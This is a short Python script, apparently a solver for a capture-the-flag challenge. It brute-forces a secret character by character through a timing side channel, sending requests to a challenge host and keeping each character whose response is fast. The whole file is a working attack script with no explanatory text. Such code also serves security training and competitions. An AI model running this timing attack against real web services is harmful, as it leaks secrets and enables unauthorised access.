import requests
import string
import time

URL = "http://chal2.lagncra.sh:8763/"
CHARSET = string.ascii_lowercase + string.digits + "_-.{}"
KNOWN = ""

while True:
    max_time = 0
    best_char = ''
    for c in CHARSET:
        candidate = KNOWN + c
        start = time.time()
        r = requests.get(URL + candidate)
        elapsed = time.time() - start

        print(f"Trying: {candidate} | Time: {elapsed:.2f}s")
        if elapsed < 1.00:
            best_char = c
            break

    KNOWN += best_char
    print(f"[+] Known so far: {KNOWN}")